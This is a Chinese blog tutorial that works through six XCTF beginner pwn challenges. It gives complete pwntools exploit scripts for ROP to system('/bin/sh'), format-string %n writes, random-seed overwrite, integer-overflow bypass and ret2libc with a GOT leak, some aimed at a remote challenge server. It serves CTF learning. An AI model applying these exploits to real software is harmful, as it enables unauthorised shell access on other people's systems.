# Mac 环境下 PWN入门系列（二）

阅读量 **1009417**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-10-31 11:30:27

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01085a83ca3713a1ab.jpg)

## 0x0 前言

菜鸡入门,刷题可能是比较快的方式,通过刷攻防世界的新手题能快速了解到pwn的各种类型的题目,然后再仔细分析各种类型的考点。

## 0x1 阅读前注意点

由于我是多次调试的，所以内存地址总会发生变化，所以读者没必要太关注内存地址，由于内存地址偏移量是不变的，我们只关注内存差值就行了。

## 0x2 实践刷题篇

这次我们接着上一篇的,直接把攻防世界新手区的题目刷完吧。

###  0x2.1 level2

####  (1)题目描述及其考点

菜鸡请教大神如何获得flag，大神告诉他‘使用面向返回的编程(ROP)就可以了’

考点: ROP

ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件

  * 程序存在溢出，并且可以控制返回地址。
  * 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。

如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。

####  (2)wp

首先日常看保护:

  * 

可以看到是32位程序, 开启了NX保护,意味着栈没办法执行代码。

我们打开ida进行分析下

![](https://p5.ssl.qhimg.com/t0159dbba6a956e7b72.png)

果断跟进那个显然漏洞函数:

![](https://p2.ssl.qhimg.com/t019190082d86f5593c.png)

我们可以很明显看 buf 的栈大小是: 0x88

这里要注意下
我们是通过填充buf去溢出数据,因为buf和vulnerablefunction函数是在同一个栈的，所以我们这里只能覆盖vulnerablefunction函数新开的栈的内容

一开始我傻傻地以为直接覆盖read函数的返回地址呢,read函数读取数据是从buffer里面读取的，根本不会有溢出的可能性，况且与buf数组也不在同一个栈空间。

而read可以读取0x100这样就存在栈溢出覆盖vulnerable_function函数返回地址为system函数,但是需要注意的是。

这里我们也要控制传入/bin/sh作为system的参数,这里我们可以利用程序内部的/bin/sh字符串地址。

至于为什么会这样,其实这个涉及到参数存放的函数约定的问题:

32位程序的参数是压入栈

64位程序前4个参数分别是rcx rdx r8 r9

所以对于32位程序,我们可以在栈上布置system的参数/bin/sh

但是64位的程序,就要进行找那种rop来构造了,后面我会细解这个相关的题目。

[x86 x64下调用约定浅析](https://blog.csdn.net/huangyimo/article/details/80573661)

[x64汇编第三讲,64位调用约定与函数传参.](https://www.cnblogs.com/iBinary/p/10959444.html)

为了更好理解这个过程:

我们可以写个rop.c 程序

    
    
    #include <stdio.h>
    
    int test(char cmd[]){
    return system(cmd);
    }
    int main(){
    char cmd[] = "/bin/sh";
    test(cmd);
    return 0;
    }

然后编译:

这里我们指定生成32位程序

    
    
    gcc -m32 -g -Wall rop.c -o rop

然后开启gdb进行调试下:

    
    
    b main

disassemble /m main 查看下汇编指令

![](https://p0.ssl.qhimg.com/t011e0fe3b7f14fd1db.png)

    
    
    # 这是一个简单的转换脚本,因为是小端序,所以[::-1]
    # '0x68732f6e69622f'
    # 所以说/bin/sh存放的时候,用了4字节对齐
    #  68732f /sh ebp-0x10先压栈
    # 6e69622f /bin ebp-0x14 低地址后压栈
    #!/usr/bin/python
    string =  '0x68732f6e69622f'
    resString = ""
    for i in range(1, len(string)//2):
    resString += chr(int(string[2*i:2*i+2], 16))
    print(int(string[2*i:2*i+2], 16))
    print(resString[::-1])

我们跟进下test函数,看他是怎么使用我们的参数的

    
    
    disassemble /m test

![](https://p1.ssl.qhimg.com/t010cefb97ef3c97d24.png)

![](https://p4.ssl.qhimg.com/t0115fa6872226d8139.png)

接着我们按si单步看下进入函数的过程

![](https://p0.ssl.qhimg.com/t01dd24b3288b96ba40.png)

![](https://p2.ssl.qhimg.com/t01446622ecab84879e.png)

可以看到我们的参数被存放到了eax寄存器里面

![](https://p0.ssl.qhimg.com/t0102a5f06e2b45766e.png)

我们继续si跟进

![](https://p1.ssl.qhimg.com/t013e7fc64269840f09.png)

这里可以看到他是通过push dword ptr [ebp+8]来获取到/bin/sh，然后压入新栈作为system的参数

这就可以看出来,参数是被分布在栈上的,并且优先于call之前

更详细参数传递内容可以参考:

这里非常感谢一个师傅提供的文章:

[C语言与反汇编学习](//chumen77.github.io/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E3%80%81%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F\))

https://blog.csdn.net/magicworldwow/article/details/80582144

[8086汇编语言-如何使用栈传递参数
](https://visualgmq.github.io/2019/08/10/8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%A0%88%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0/)

重新回到我们这个题目来,我们可以通过覆盖vulnerable_function 函数栈空间修改ret,达到任意调用system执行任意代码。

这里先扔出exp

    
    
    #! /usr/bin/env python
    # -*- coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    # 这个设置debug能看到exp执行的流程
    
    elf = ELF('./pwn6')
    sys_addr = elf.symbols['system']
    sh_addr = elf.search('/bin/sh').next()
    # 这里利用了pwntools两个小用法,方便我们操作
    # 我们通过ELF加载elf文件,然后自动搜索里面的函数地址和寻找字符串。
    # 这里因为是程序内部存在的，所以我们可以直接找到
    # elf.search('/bin/sh').next() 这个其实和我们上面的那个ida直接搜索字符串得到地址是一样的
    payload = 'A' * 0x88 + 'B'*0x4 + p32(sys_addr) +  p32(0xdeadbeef) + p32(sh_addr)
    # 这里0x88是栈空间大小,然后0x4是覆盖掉ebp,后面是调用system+任意的system返回地址+参数
    # io = remote('111.198.29.45',51157)
    io =  process('./pwn6')
    io.sendlineafter("Input:\n",payload)
    io.interactive()
    io.close()

####  (3)动态调试payload

为了更深入理解这个机制，我们可以通过gdb+pwntools来进行动态调试

我们修改下脚本:

    
    
    #! /usr/bin/env python
    # -*- coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    
    elf = ELF('./pwn6')
    sys_addr = elf.symbols['system']
    sh_addr = elf.search('/bin/sh').next()
    
    payload = 'A' * 0x88 + 'B'*0x4 + p32(sys_addr) +     p32(0xdeadbeef) + p32(sh_addr)
    
    # io = remote('111.198.29.45',45800)
    
    io =  process('./pwn6')
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # 这里配置tmux纵向显示,
    gdb.attach(io)
    io.sendlineafter("Input:\n",payload)
    io.interactive()
    io.close()

然后在docker里面(ps.环境看我第一篇入门文章的配置),执行tmux进入新的终端,然后就可以调试了。

这里介绍下tmux的用法:

tmux的前缀是: ctrl + b 代表进入tmux标志

1.

(1)ctrl + b 然后再按冒号: 进入命令行模式,输入

set -g mouse on 回车之后就可以用滚轮来上下拖动了

(2)我们直接修改配置文件,来长期保持

    
    
    vim ~/.tmux.conf
    
    set -g mode-mouse on

2.

ctrl+b 然后按住s 可以切换不同的会话

3.

ctrl+b 然后按w可以查看窗口 按n切换到下一个窗口 按p切换到上一个窗口

我们执行下disassemble查看下当前位置

![](https://p0.ssl.qhimg.com/t01647a40caaba01146.png)

然后finish执行跳出

![](https://p2.ssl.qhimg.com/t0196d41980119ce1f1.png)

进入到里面之后,我们打印下栈结构stack 30 如果过长的话 按下回车会继续显示

![](https://p0.ssl.qhimg.com/t016189130b2b016c3a.png)

我们可以看到当前栈EBP寄存器已经被我们传入的数据覆盖了。

那么具体覆盖的过程是怎么样的呢，我们可以更精细化来debugs

一开始我们先不要finish跳出来,我们看下当前的函数调用栈

![](https://p2.ssl.qhimg.com/t0154d20342b92e1a4d.png)

可以看到是main->vulnerable_function->read->vulnerable_function->main

我们finish执行玩这个函数,就会ret回到read+39继续执行。

![](https://p0.ssl.qhimg.com/t013196250cf2a498ba.png)

可以看到read一下子把我们的payload填充进去,成功复写了vulnerable_function函数的函数调用栈,变成了system然后system的父函数是deadbeed(这个就是我们随便定义的返回地址)

那么具体的复写机制是怎么样的呢,这个我们就需要跟踪程序的执行过程就可以理解为什么这样布置栈数据了(布置公式:
sys_plt+p32(0xdeadbeef)+p32(binsh_addr)

我们继续finish跳出read函数回到vulnerable_function函数现场。

接着si 3直接跳到ret看下read函数的栈结构 stack

![](https://p3.ssl.qhimg.com/t01fcecf975fab92fe7.png)

ret指令的作用:

栈顶字单元出栈，其值赋给EIP寄存器。即实现了一个程序的转移，将栈顶字单元保存的[偏移地址](https://www.baidu.com/s?wd=%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao)作为下一条指令的[偏移地址](https://www.baidu.com/s?wd=%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao)。

上一篇文章说过了,ebp是当前进入函数的指令地址，ebp+4就是下一条指令地址

这就是’A’ * 0x88 + ‘B’*0x4 + p32(sys_addr) 这样组合的原因

这里我们可以看到ESP就是就是system函数地址了,那么下一条指令就进去了system函数了

我们继续si 跟进 分析下后半段payload(p32(0xdeadbeef) + p32(sh_addr))的原因:

跟着system进去上千行代码是自闭的

其实这个原理就是默认程序调用就是ebp+4 是返回地址,

返回地址+4就是参数值,这个就回到了上面的知识点了,关于参数传递的问题。

push 参数  
push 返回地址  
push 函数地址

####  (4) 相关参考文章

[XCTF攻防世界 level2 ](https://bbs.pediy.com/thread-251334.htm)

[pwntools连gdb调试脚本](/thonsun.github.io/2019/07/17/pwntools%E8%BF%9Egdb%E8%B0%83%E8%AF%95%E8%84%9A%E6%9C%AC/\))

###  0x2.2 string

####  (1) 题目描述及其考点

菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求

考点: 格式化字符串漏洞

####  (2) wp

日常查程序架构、保护

![](https://p4.ssl.qhimg.com/t010845b152d7d73c23.png)

可以看到除了pie其他都开了,然后就是上ida了

这个程序有点复杂，当时我是一个一个函数跟进去看的，为了减少文章篇幅，这里只取重要的点来举例说明。

![](https://p5.ssl.qhimg.com/t01054a2c60cc798486.png)

我们继续跟进sub_400BB9

![](https://p2.ssl.qhimg.com/t012160d0c406ae507d.png)

但是因为开了保护，所以任意地址读写没办法直接拿到flag。

![](https://p1.ssl.qhimg.com/t01072358072f45fbef.png)

虽然在下一个函数我们可以发现只要满足条件*a1 == a1[1]那么我们就可以了,我们看下他们两者的取值过程。

![](https://p4.ssl.qhimg.com/t01e170490554bfb118.png)

这里感觉就很显然了，因为al就是v4,而v4的地址就是v3,写死了*v3=68
v3[1]=85,很很明显不相等，所以我们考虑结合下字符串格式化漏洞去修改其中一个值与另外一个值相等。

,竟然直接printf(“%x”)输出了*a和a1[1]的地址,

那么结合上面那个字符串格式化任意地址写，修改两者的值就可以轻松完成了，这里直接给出exp构造过程。

不理解字符串格式化的朋友,可以先看我前一篇[文章](https://www.anquanke.com/post/id/187922#h3-18)，这里我就不累赘了。

因为v3是malloc动态内存地址，所以我们先通过程序直接获取到v3地址

    
    
    io.recvuntil('secret[0] is ')
    addr = int(io.recvuntil('\n'), 16)

然后满足一些条件

![](https://p2.ssl.qhimg.com/t01bfb85959955ab96d.png)

    
    
    io.recvuntil('secret[0] is ')
    addr = int(io.recvuntil('\n'), 16)
    io.sendlineafter('be\n', 'xq17')
    io.sendlineafter('up\n', 'east')
    io.sendlineafter('leave(0)?:\n', '1')

这样我们就满足了条件,开始进入了

![](https://p2.ssl.qhimg.com/t01e3d4a616a549079d.png)

这里的printf一开始我不是很懂的，因为我之前做的是printf(&s);这样的形式，这里我们可以采取debug查看下

我们自己写一个程序并且关闭保护再编译:

    
    
    #include <stdio.h>
    
    int main()
    {
    char format;
    // char a = "123";
    scanf("%s", &format);
    printf(&format, &format);
    return 0;
    }
    
    gcc  -fno-stack-protector -no-pie -g -Wall printf.c -o test

我们可以发现其实这个很简单的，我们输入format=”%s” 其实就是等价printf(“%s”, “%s”)

那么根据printf函数定义,第一个是格式化字符串解析格式化字符%s然后把后面的参数解析位字符串”%s”

![](https://p0.ssl.qhimg.com/t01ce150a7da389754a.png)

所以这里并不影响我们执行格式化字符串，因为我们主要利用还是第一个参数，第二个无所谓。

这里我们需要把v3修改为85,那么%$xn中的x就是p64(addr)对应的printf的第几个参数

然后

    
    
    sizeof(p64(addr)) + %(85-sizeof(p64(addr)) )c + %$xn

就可以利用printf修改addr中的值了。

利用的话我们是构造

    
    
    #!/usr/bin/env python
    #-*- coding:utf-8 -*-    
    from pwn import *
    context(log_level = 'debug', arch = 'amd64', os = 'linux')
    io =  process('./pwn7')
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # 这里配置tmux纵向显示
    # gdb.attach(io)
    # io.sendlineafter("Input:\n",payload)
    io.recvuntil('secret[0] is ')
    addr = int(io.recvuntil('\n'), 16)
    io.sendlineafter('be:\n', 'xq171')
    io.sendlineafter('up?:\n', 'east')
    io.sendlineafter('leave(0)?:\n', '1')
    # gdb.attach(io)
    io.sendlineafter("address'\n", str(addr))
    io.sendlineafter("is:\n", str(addr) + "%77c%7$n")
    # io.sendlineafter("is:\n", "AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x")
    shellcode =  asm(shellcraft.sh())
    io.sendlineafter("SPELL\n", shellcode)
    io.interactive()
    io.close()

这里我是通过AAAA出现在第7个位置来确定位移的。

![](https://p3.ssl.qhimg.com/t017b10d5a075e607fe.png)

    
    
    # io.sendlineafter("is:\n", "AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x")

刚好是在第7个位置,然后 str(addr)存放了一个内存空间64位8字节

![](https://p2.ssl.qhimg.com/t01472284ebaf1ce47c.png)

所以0x85-0x8=0x77

io.sendlineafter(“is:\n”, str(addr) + “%77c%7$n”) 这就是来源。

或者可以直接看栈结构,esp就是第一个第一个参数

![](https://p4.ssl.qhimg.com/t016765bc3c9fdc3463.png)

可以看到format就是在第7个位置。

* * *

上面是华丽的错误分割线，其实我上面的说法是错误的，为什么能成功呢，主要原因还是修改了上面那个变量的值。

其实正确的做法是这样:

这里我们可以重新分析一下如果把

    
    
    io.sendlineafter("an address'\n", str(addr))

放在了v2变量上，那么怎么计算printf的第几个参数

![](https://p5.ssl.qhimg.com/t01d2158c1de4b1816e.png)

我们通过pwntools+gdb来进行调试可以看到即将进入printf的函数的栈结构，可以看到v[0]存放的栈空间地址。

![](https://p0.ssl.qhimg.com/t01f326248dd4cd6aaf.png)

可以看printf获取到的参数,这里我们选择si跟进这个函数,

call 指令是调用函数 分为两步:(1)将当前的rip压入栈中 (2)转移到函数内  
push RIP  
jmp x

可以看到他把下一条要执行指令存到了栈里面，保护现场，然后跳到函数内部执行

![](https://p5.ssl.qhimg.com/t014b69fc4e0fce0952.png)

然后开辟了栈空间，然后取参数,finish执行完，查看栈参数

![](https://p5.ssl.qhimg.com/t01abf1fd2a5f6c2196.png)

这里是64位,参数存放有点问题,

在x86_64架构（Linux或Unix系统）上，函数的前6个参数是通过寄存器传递的

所以6+1=7 %7$n的位置就是对应格式化字符串输入的位置。可以看到0x21a9269就是我们对应的那个str(addr)

这就是网上那些wp的做法。

这里重新回到我们上一篇文章中通过自己在格式化字符串写入地址的做法

我当时做前面那个题目是把地址写在了格式化字符串里面的,也就是这样

    
    
    io.sendlineafter("is:\n", p64(addr)+"%77d%8$n")

然后开启gdb进行调试:

    
    
    gdb.attach(io, "b printf\n c") #设置下断点

然后finish查看

![](https://p3.ssl.qhimg.com/t013fc4427b05b95ac1.png)

可以看到是在6+2=8第8个位置上,但是执行完的时候

x/2dx 0xf2c260 查看内存发现值并没有改变

这里介绍下gdb查看内存用法

比较常用:

x/2wd w是指定4字节长度,2是指取当前地址开始8字节也就是两个比如数组就是 v[0] v[1]的值,d就是十进制来显示

x/2wx x是16进制表示

[gdb调试时查看内存](https://blog.csdn.net/yasi_xi/article/details/7322278)

![](https://p5.ssl.qhimg.com/t012adc352934c17a5c.png)

其实原因，还是因为64位转换地址的时候出现了截止字节\x00这样导致printf取参数的时候就没办法读取后面的字符进去了。

所以我们就要把地址放在后面，这样子来重新构造。

####  (3) 相关参考文章

[格式化字符串漏洞利用](https://wiki.x10sec.org/pwn/fmtstr/fmtstr_exploit/)

###  0x 2.3 guess_num

####  (1) 题目描述及其考点

菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么

考点: 栈溢出及其随机数原理

####  (2) wp

日常看保护,然后开ida。

![](https://p3.ssl.qhimg.com/t01e3042840ea1a2cc3.png)

保护全开

![](https://p5.ssl.qhimg.com/t0157f20bf59bbf0c95.png)

这个题目的基本思路是通过sub_BB0生成一个随机数种子,然后想要我们猜对后面的数列，gets函数因为不限制读取的长度，所以会造成栈溢出，这里涉及到一个很常见的随机数考点，就是计算机里面很多随机数都是伪随机数算法，就是根据一个seed生成一个固定的随机数数列

所以这个题目的考点就回到如何通过栈溢出覆盖掉seed[0]

![](https://p5.ssl.qhimg.com/t01d9d4bf2eeb1f778e.png)

我们可以看到这里的栈溢出保护没用，因为我们根本不会超出栈空间，

这里我们计算下相对位置:

![](https://p5.ssl.qhimg.com/t0152c8089794f793b7.png)

-0x10 – (-0x30)=0x10

那么我们直接上exp就行了,这个题目考点还是比较简单的。

这里需要用到python一个库ctypes来伪造libc.so的随机数算法

首先查看程序使用的lib.so版本

cmd: ldd pwn8

![](https://p2.ssl.qhimg.com/t01a91cbab99f0e9cf5.png)

    
    
    from pwn import *
    from ctypes import *
    
    io = remote('111.198.29.45', 54570)
    libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    # 这里修改种子为1
    payload = 'A'*0x10 + p64(1)
    io.sendlineafter('name:',payload)
    for i in range(20):
    # rand 默认是种子是1
    io.sendlineafter('number:',str(libc.rand()%6 + 1))
    io.interactive()

####  (3)题目小结

这个题目感觉没什么考点，不过能巩固之前学的知识点，而且与一些其他特性结合起来，比如随机数考点，对于我这个摸鱼几年的web选手来说应该比较熟悉了。

###  0x2.4 int_overflow

####  (1) 题目描述及其考点

菜鸡感觉这题似乎没有办法溢出，真的么?

考点: 整数溢出

####  (2) wp

![](https://p1.ssl.qhimg.com/t01f57b5e20f5421cd8.png)

按照前面所讲的思路，跟进所有函数，发现关键函数(笔者开始省略日常步骤，建议新手实操检验学习成果)

![](https://p4.ssl.qhimg.com/t0144e2cd004fc13b0d.png)

这里看到将最大长度为0x199的s传给char为1的dest(距离ebp 0x14h),这里就会造成栈溢出，我们发现程序存在system函数

![](https://p2.ssl.qhimg.com/t01a51e041d4fed1642.png)

然后通过ida定位ctrl+x我们可以找到cat /flag函数的地址为:0x0804868B

解决了上面问题，我们就要思考如何控制程序进入我们上述的流程了。

但是前面好像限制了输入的长度v3(无符号整数范围就是0-2^8-1),但是我们至少都得溢出(0x14h+size(ebp))（24）长度

所以这里我们就可以控制v3让他超过范围发生整数溢出,这样我们就可以输出超过8位的字符,通过计算控制溢出之后的v3范围在3-8

那么我们的构造公式就可以是:’A’*24 + p32(0x0804868B)+ ‘A’+(259-28) 这样溢出的时候v3就是3了。

直接丢出exp,多出来的长度会继续向下覆盖，但是程序跳转到system了所以没有关系。

    
    
    from pwn import *
    
    io = remote("111.198.29.45", 48764)
    io.sendlineafter('Your choice:','1')
    io.sendlineafter('username:','aa')
    payload = "A"*24 + p32(0x804868b) +'A'*(259-28)
    io.sendlineafter('passwd:',payload)
    io.interactive()

你懒得计算也可以利用python一些右对齐函数比如

    
    
    payload = "a"*24 + p32(0x804868b)
    payload = payload.ljust(259,"A")
    这样就会让payload刚好259长度，然后A在右边填充。
    256 -> 0
    257 -> 1
    ...
    259 -> 3

###  0x2.5 cgpwn2

####  (1) 题目描述及其考点

菜鸡认为自己需要一个字符串

考点: 栈溢出题目_变形

#### (2) wp

日常checksec

![](https://p2.ssl.qhimg.com/t016e865e8596e6e190.png)

没有栈溢出保护,上ida

![](https://p0.ssl.qhimg.com/t01a2b4e3b94895a4a7.png)

乍看的时候我感觉好像涉及到比较复杂的计算，这个时候我建议直接从后面开始回溯读取，让时间最小化。

结果发现我们只要重点关注最后两行输入就行了。

很明显这里用了gets所以我们可以直接retlibc hello函数

我们查看下有没有system函数,ida查看导入函数表

![](https://p0.ssl.qhimg.com/t01ada894dd3a56fc95.png)

然后我们还需要找/bin/sh

这里浅浅分析下为什么要找/bin/sh，

1.因为内存地址是动态的，我们没办法知道我们写入的字符串地址

2.我们可以借助一些存放在bss段等可知的内存空间变量

不理解可以查阅相关资料

keyword: 程序是如何加载进内存的

或者后面我会分析一波。

这个题目我们可以利用

fgets(name, 50, stdin);伪造name为一个/bin/sh字符串

我们查看下name的位置,

![](https://p5.ssl.qhimg.com/t0167272db2d2c8b71d.png)

bingo！ 是在bss段(未初始化的变量),所以我们可以写入一个字符串了

这里注意下c语言字符串末尾必须得带上\x00

所以这里就是简单计算的问题了，刚好考验下刚才level2操作，这里我就不赘述了，直接exp

    
    
    from pwn import *
    io = remote('111.198.29.45', 51465)
    sh_addr = 0x0804A080
    io.sendlineafter('name','/bin/sh\x00')
    io.sendlineafter('here:','a'*42 + p32(0x08048420) + p32(0xdeadbeef) + p32(sh_addr))
    io.interactive()

###  0x2.5 level3

####  (1) 题目描述及其考点

libc!libc!这次没有system，你能帮菜鸡解决这个难题么?

考点: 栈溢出_加强版ROP利用lib.so函数

####  (2) wp

日常checksec

![](https://p2.ssl.qhimg.com/t0196025c685512b910.png)

然后上ida

![](https://p1.ssl.qhimg.com/t01745c85701e5ebd80.png)

非常简洁的一个read函数溢出，但是这里没有system和/bin/sh

![](https://p4.ssl.qhimg.com/t01e7facd124798c212.png)

我们可以看到libc_32.so.6是开了地址随机化的，也就是说里面的函数地址是变化，但是不同函数直接的相对偏移地址是不变的(libc.so文件中各个函数的相对位置和加载到内存中之后各个函数的相对位置相同)

换句话说就是这样:

假设 A在 libc32.so.6中当前的地址是 0x1 B在 libc32.so.6 是0x3 (这个我们可以ida或者readelf查看得到)

当程序进行加载 libc_32.so.6的时候，地址会随机化

假设A 变成了 0x2 那么我们就可以通过计算 0x2 + (0x3-0x1) = 0x4 得到b的地址

那么我们下面就进行具体的操作吧

pwntools的一些基础操作介绍:https://www.cnblogs.com/Ox9A82/p/5728149.html

如果不明白pwntools的指令可以先前去学习一下

首先程序加载的时候会有个映射，这就涉及到plt和got表,其中got表存放的就是函数绝对地址

(关于plt+got动态绑定的知识，后面我会重新细讲一波)。

可以先掌握一些概念

GOT(Global Offset Table): 全局偏移表

PLT(Procedure Link Table): 程序链接表

call printf@plt 就是先去plt表的printf 然后再jmp *printf@got 跳到got表找到真实的printf地址

延迟绑定: 程序在使用外部函数库的时候并不会将所有函数进行链接，而是在使用的时候再重新链接

实现延迟绑定:

jmp “地址”

push “ printf引用在重定位表的“.rel.plt”中的下标”；

jump dlruntime_resolve//这个函数是完成符号解析和重定位的；

_dl_runtime_resolve_avx：找到调用它的函数的真实地址，并将它填入到该函数对应的GOT中

可以提前学习一波这个文章。

[计算机原理系列之八 ——– 可执行文件的PLT和GOT](https://luomuxiaoxiao.com/?p=578#221)

程序在执行第一次write函数的时候会调用_dl_runtime_resolve_avx,got表就会建立起来，第二次调用时

就会直接加载got表对应的就是加载lib_32.so.6内存地址值。

先简单说下这个题目的思路:

1.我们利用read函数溢出覆盖ebp,ebp+4
存放的是write函数参数(write的got表地址)，下面依次是write函数的返回地址(vulnerable_function) 在到write函数地址

2.程序执行完write函数之后会输出got表的中write函数的地址，然后ret再一次跳到vulnerable_function这个函数上面，我们在进行溢出执行偏移后的system地址，完成调用

这里借用一个大神博客的图:

![](https://p3.ssl.qhimg.com/t01f546d6bf6c415bab.png)

我们先获取偏移量:

    
    
    readelf -a ./libc_32.so.6 |grep " write@"
    > 2323: 000d43c0   101 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.0
    readelf -a ./libc_32.so.6 |grep " system@"
    > 1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
    readelf -a ./libc_32.so.6 |
    >strings -a -t x ./libc_32.so.6 | grep "/bin/sh"
    > 15902b /bin/sh

1.首先获取write地址代码

    
    
    io = process('./level3')
    elf = ELF('./level3')
    libc=ELF('libc_32.so.6')
    write_addr = elf.symbols['write']
    vul_addr= elf.symbols['vulnerable_function']
    got_addr= elf.got['write']
    # write函数有4个参数write(1(代表向输出流写入),字符串地址值,输出长度) 压栈的时候是先从右边开始
    #但是我们写payload的时候是从左边开始压的要记住，pwntools会自己转换的。
    payload1="a"*140+p32(write_addr)+p32(vul_addr)+p32(1)+p32(got_addr)+p32(4)
    io.recvuntil("Input:\n")
    io.sendline(payload1)
    write_addr=hex(u32(io.recv(4)))
    print(write_addr)

![](https://p5.ssl.qhimg.com/t01786cf1dbcb3edcfd.png)

这里我们调用pwntool来直接计算偏移：

    
    
    libc_write=libc.symbols['write']
    libc_system=libc.symbols['system']
    libc_sh=libc.search('/bin/sh').next()
    print(hex(libc_write))
    print(hex(libc_system))
    print(hex(libc_sh))

![](https://p5.ssl.qhimg.com/t01f1b87278a5837e3c.png)

可以看到和我们上面的结果是一致的

然后我们计算偏移公式很简单a’+ b-a就是b’的距离

直接上exp.py

    
    
    from pwn import *
    
    # io = process('./level3')
    io = remote('111.198.29.45', 51844)
    elf = ELF('./level3')
    libc=ELF('libc_32.so.6')
    write_addr = elf.symbols['write']
    vul_addr= elf.symbols['vulnerable_function']
    got_addr= elf.got['write']
    payload1="a"*140+p32(write_addr)+p32(vul_addr)+p32(1)+p32(got_addr)+p32(4)
    io.recvuntil("Input:\n")
    io.sendline(payload1)
    write_addr=u32(io.recv(4))
    print(hex(write_addr))
    libc_write=libc.symbols['write']
    libc_system=libc.symbols['system']
    libc_sh=libc.search('/bin/sh').next()
    print(hex(libc_write))
    print(hex(libc_system))
    print(hex(libc_sh))
    system_addr=write_addr + libc_system - libc_write
    sh_addr=write_addr + libc_sh -libc_write
    payload2='a'*140+p32(system_addr)+"aaaa"+p32(sh_addr)
    io.sendline(payload2)
    io.interactive()

####  (3) 题目小结

这个题目可以说是基础ROP的入门，通过控制返回地址进行多重跳，很有进阶的意义。

####  (4) 参考文章

[计算机原理系列之八 ——– 可执行文件的PLT和GOT](https://luomuxiaoxiao.com/?p=578#221)

[Writeup of level3(Pwn) in
JarvisOJ](https://blog.csdn.net/cossack9989/article/details/79326659)

[聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT](https://blog.csdn.net/linyt/article/details/51635768)

## 0x3 总结

这次这几个题目做了2.3天，感觉收获还是挺大的，其中很感谢一些师傅回答我比较傻的问题，一语惊醒梦中人，期间我也看了网上很多wp，基本都是雷同或者草草了事的，很少有那种新手摸索的过程，因为本人是个菜鸡，难免会有疏漏，希望各位师傅多多包容，然后指出，让我更加深pwn的理解，谢谢。

## 0x4参考链接

[ROP学习：64位栈溢出](/chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/\))

[linux-pwn基础1](/yaov.net/2018/09/15/linux-pwn%E5%9F%BA%E7%A1%801/\))

[Ret2libc详解](https://zhouyetao.yzzaccept.top/index.php/2019/06/16/ret2libc.html)

[Linux gdb调试器用法全面解析](https://blog.csdn.net/21cnbao/article/details/7385161)

[攻防世界pwn之新手练习区](https://www.cnblogs.com/at0de/p/11269120.html)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **xq17** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/189960](/post/id/189960)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __7赞

 __收藏

![](https://q.qlogo.cn/qqapp/101431079/FB5738D77CCE7E738CDE1AA49ED6757A/40)
xq17

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

